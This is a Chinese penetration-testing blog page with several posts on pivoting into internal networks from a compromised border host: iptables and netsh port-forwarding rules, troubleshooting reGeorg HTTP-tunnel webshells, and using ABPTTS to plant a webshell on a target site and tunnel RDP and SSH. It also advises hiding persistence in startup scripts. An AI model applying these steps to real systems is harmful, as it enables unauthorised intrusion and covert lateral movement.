<p>4,暂时先关闭iptables服务,实际渗透渗透中,最好不要关,很容易把人搞断,这里只是为了做实验而已<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/iptables status &amp;&amp; /etc/init.d/iptables stop</span></div></pre></td></tr></table></figure></p>
<p>5,利用iptables添加转发规则,这里以转发内网指定机器的rdp为例,至于别的端口都是同样的转发方法,请自行尝试<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A PREROUTING -d  [边界机器的公网地址] -p tcp -m tcp --dport [边界机器端口] -j DNAT --to-destination [内网机器的IP]<span class="symbol">:</span>[内网机器的端口]</div><div class="line">iptables -t nat -A POSTROUTING -d [内网机器的IP] -p tcp -m tcp --dport [内网机器端口] -j SNAT --to-source [边界机器的内网ip]</div><div class="line">iptables -A FORWARD -o [边界机器的内网网卡编号] -d [内网机器IP] -p tcp --dport [内网机器端口] -j ACCEPT</div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /sbin/iptables -P INPUT ACCEPT</span></div><div class="line"><span class="comment"># iptables -t nat -A PREROUTING -d 192.168.3.40 -p tcp -m tcp --dport 3389 -j DNAT --to-destination 192.168.32.134:3389</span></div><div class="line"><span class="comment"># iptables -t nat -A POSTROUTING -d 192.168.32.134  -p tcp -m tcp --dport 3389 -j SNAT --to-source 192.168.32.129</span></div><div class="line"><span class="comment"># iptables -A FORWARD -o eth1 -d 192.168.32.134 -p tcp --dport 3389 -j ACCEPT</span></div></pre></td></tr></table></figure>
<p>6,保存&amp;&amp;重启iptables服务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/iptables save &amp;&amp; /etc/init.d/iptables restart</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/iptables rules port forward.png" alt=""><br><img src="/img/iptables rdp.png" alt=""><br></p>
<p>7,删除防火墙规则,只删除你自己的规则就好了,别的不要动,记得关闭保存并重启防火墙才可生效<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># iptables -F</span></div></pre></td></tr></table></figure></p>
<p>8,如果想实现自启动也比较简单,直接把它丢到一些系统的自启动脚本中即可,越隐蔽越好,不要放到rc.local中就行,还是那个问题,如果中间有任何防护阻断某些端口通信,基本也就废了,因为你是bind进去的,说白点,最终主动权还是在别人手里<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/18/netsh-portfward/">
                通向彼岸 之内网代理转发 [ 系统篇 netsh ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/netsh/">netsh</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;除了前面提到的用一些端口转发工具来进行端口转发,其实windows系统自己也给我们提供了类似的功能,比如,其自带的防火墙管理工具’netsh’套件(确实非常实用),尤其碰到一些稍微畸形点的内网环境:<br><br></p>
<p>1,先来假设这么一种情况<br>&nbsp;&nbsp;&nbsp;&nbsp;当你搞定边界的一台windows机器以后,上去一看发现,机器上有两块网卡,一块外网卡,一块内网卡(先以正常的DMZ来讲),这时又你通过别的方式搞定了同内网的另一台windows机器,本来以为简单的种上马就可以走人了,但你发现马执行以后似乎什么都没发生,搞了半天,你才发现,原来这台内网机器根本不能连外网,说到这里,相必你也应该知道我要干啥了,没错,虽然内网的那台机器不能连外网,但它起码能跟边界的这台机器正常通信,这就够了,我们可以直接从外部通过边界这台机器来访问内网的那台不能连外网的机器<br><br><br>2,演示简单环境如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">目标的边界机器(win7en) <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.212</span>(假设为目标公网ip,这台机器没有任何服务,就是台个人机,rdp和telnet当然也不会开了) <span class="number">192.168</span>.<span class="number">32.132</span>(目标内网ip)</div><div class="line">目标内网的那台不能连外网的机器(win <span class="number">2008</span>r2cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span>(目标内网ip)</div><div class="line">外部的攻击者的机器(win7cn) <span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
<p>3,要实现的目的很简单:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先,可以确认的是,边界机器和攻击者机器通信正常,边界机器和目标内网的那台不能连外网的机器通信正常</div><div class="line">现在,我想通过边界机器的某个端口去访问目标内网的那台不能上外网的机器的<span class="number">3389</span>,下面是具体的操作步骤</div></pre></td></tr></table></figure></p>
<p>4,如果边界的机器是xp/03的系统,可能还需要你先装下ipv6支持,08以后的系统就不用装了,默认自带<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh interface ipv6 install</span></div></pre></td></tr></table></figure></p>
<p>4,首先,先看下系统中现有的转发规则<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh interface portproxy show all</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/netsh interface proxy show all.png" alt=""><br></p>
<p>5,开始添加转发规则,意思就是把来自的外部的某个端口的流量,转到同网段中其他机器的指定端口上,这里其实就是转到我的2008的机器上,当然啦,你事先肯定要确保,你要访问的那个目标机器的端口开了才行<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.32.134 connectport=8080</span></div><div class="line"><span class="comment"># netsh interface portproxy add v4tov4 listenport=3389 connectaddress=192.168.32.134 connectport=3389</span></div><div class="line"><span class="comment"># netsh interface portproxy add v4tov4 listenport=22 connectaddress=192.168.32.134 connectport=22 </span></div><div class="line"><span class="comment"># netsh interface portproxy add v4tov4 listenport=23 connectaddress=192.168.32.134 connectport=23</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/proxy add interfaces.png" alt=""><br></p>
<p>6,现在尝试访问边界机器,看看我们的转发到底有没有生效<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mstsc <span class="number">192.168</span>.<span class="number">3.212</span><span class="symbol">:</span><span class="number">3389</span></div><div class="line">putty <span class="number">192.168</span>.<span class="number">3.212</span><span class="symbol">:</span><span class="number">22</span>   尝试访问和边界机器处在同内网的另一台linux机器</div></pre></td></tr></table></figure></p>
<p><img src="/img/proxy succed.png" alt=""><br><br><img src="/img/proxy telnet.png" alt=""><br><br><img src="/img/proxy tomcat.png" alt=""><br><br><img src="/img/proxy ssh.png" alt=""><br></p>
<p>7,用完以后,别忘了删除自己之前创建的转发规则<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh interface portproxy delete v4tov4 listenport=8080</span></div><div class="line"><span class="comment"># netsh interface portproxy delete v4tov4 listenport=22</span></div><div class="line"><span class="comment"># netsh interface portproxy delete v4tov4 listenport=23</span></div><div class="line"><span class="comment"># netsh interface portproxy delete v4tov4 listenport=3389</span></div></pre></td></tr></table></figure></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;大家从整个流程也都看到了,总体来讲就是一路bind进去的过程,也就是说,中间只要有任何防火墙阻断了某些端口,这种方式可能就废掉了,所以,具体利用场景大家还是酌情而定吧,另外,关于netsh的更多高级用法,还正在学习中,待续……</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/16/http-tunnel-question/">
                通向彼岸 之内网代理转发 [ http隧道篇 使用过程中容易出现的一些问题 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-16</span>
            
            
            
                <span class="category">
                    <a href="/categories/http-tunnel/">http tunnel</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="关于使用http隧道代理脚本时-容易出现的一些错误及解决办法"><a href="#关于使用http隧道代理脚本时-容易出现的一些错误及解决办法" class="headerlink" title="关于使用http隧道代理脚本时,容易出现的一些错误及解决办法:"></a>关于使用http隧道代理脚本时,容易出现的一些错误及解决办法:</h5><p>1,如果是php程序,你可能需要先确保php.ini中的socket模块已正常开启并且可用,因为php中的socket函数要基于此模块,不过,reGeorg早已经提供了不再需要开启socket的代理脚本<br>2,有时候你在绑定某些端口会遇到socket无法建立连接的问题,不妨尝试换一下端口,比如:53,8080,443,只要不跟目标系统中的现有端口冲突即可,尽量用一些穿透性比较好的端口<br>3,有时还会遇到aspx 运行错误,看具体是什么错误,如果一眼解决不了,谷歌一下,里面肯定一大堆,比如:’Compilation Error’,可以尝试在代理脚本(webshell)的当前所在目录,另外新建一个web.conf文件,一般也即可解决,文件具体内容如下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;configuration&gt;</div><div class="line">  &lt;system.web&gt;</div><div class="line">  &lt;customErrors mode="Off"/&gt;</div><div class="line">  &lt;/system.web&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure></p>
<p>4,对于aspx的网站,如果aspx总是报错,不妨尝试换成ashx.aspx,在regerog中也已经有提供<br>5,关于regerogsocksproxy 脚本的https证书和阻塞问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">urllib3.exceptions.<span class="symbol">SSLError:</span> [<span class="symbol">SSL:</span> CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.<span class="symbol">c:</span><span class="number">590</span>)</div></pre></td></tr></table></figure></p>
<p>6,更多,待续……<br><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;至此为止,关于利用http隧道进行内网渗透的方式差不多就介绍完了,对于工具而言,总体来说,各有亮点,还是那句话,多实践,有些在实际的使用中,可能还需要稍微改下,别懒就行,另外,还有个比较蛋疼的地方,我们的代理端(webshell)有时经常会被一些waf或者杀软查杀,比如,我自己所知道的 安全狗,nod,就肯定会查杀……关于流量和代码中的webshell特征剔除是个比较大的话题,有机会咱们再单独说,另外,文章中的描述多多少少有些问题,可能并不是太专业,但,我的目的只有一个,能把问题描述清楚即可,如果实在想搞清楚http隧道更底层的通信细节,不妨自己在本地拿wireshark仔细看下,wireshark会帮你说明一切</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/15/abptts-http-tunnel/">
                通向彼岸 之内网代理转发 [ http隧道篇 abptts ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-15</span>
            
            
            
                <span class="category">
                    <a href="/categories/http-tunnel/">http tunnel</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;abptts 一款基于简单传输加密的http隧道工具,实际测试中相对来说还算比较稳定,起码比regerog都要稳定一些,且全程通信数据加密,可一定程度上对抗取证检测,就单这一点来说,还是很赞的,不过,加不加密,它自己说的不算,还是老办法,拿wireshark耐心的走一遍,就明白了,尽量用事实说话嘛<br><br><br>1,首先,安装好工具所需的各种py依赖库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pip install pycrypto    加密库,整个数据加密都要靠这个</span></div><div class="line"><span class="meta">#</span><span class="bash"> pip install httplib2</span></div></pre></td></tr></table></figure></p>
<p>2,生成好服务端(webshell),-o用来指定要生成到的目录,然后把生成好的对应类型的代理脚本扔到目标网站目录中,并尝试访问该脚本,如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> python abpttsfactory.py -o webshell</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/abppts_webshell.png" alt=""><br><img src="/img/abppts_webshell_upload.png" alt=""><br><img src="/img/abppts_webshell_request.png" alt=""></p>
<p>3,前面确认没有问题后,现在开始绑定端口,建立隧道,下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定,-c用来指定webshell的配置文件,-u 指定webshell的url,关于更多选项用法,看下工具帮助就明白了,都非常简单的:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># python abpttsclient.py -c webshell\config.txt -u <span class="string">"http://www.target.org/UcControl/abptts.aspx"</span> -f <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">1234</span>/<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">3389</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/abppts_webshell_link.png" alt=""></p>
<p>4,隧道建立成功后,用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口],即可访问目标内网中的资源:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">mstsc</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:1234</span></div><div class="line"># <span class="selector-tag">putty</span> <span class="selector-tag">ssh</span> <span class="selector-tag">root</span>@<span class="keyword">127</span>.<span class="keyword">0</span>.<span class="keyword">0</span>.<span class="keyword">1</span> -p <span class="number">1234</span> -i ~/.ssh/xxx/id_rsa  	如果对方的ssh只允许证书登录,加载上自己的证书即可</div></pre></td></tr></table></figure></p>
<p><img src="/img/abppts_webshell_succes.png" alt=""><br><br></p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/3/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/5/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klionsec">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:klionsec@gmail.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    <h2>blog by klion</h2>
                </div>
            </div>
        </div>
    </div>
</footer>


<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>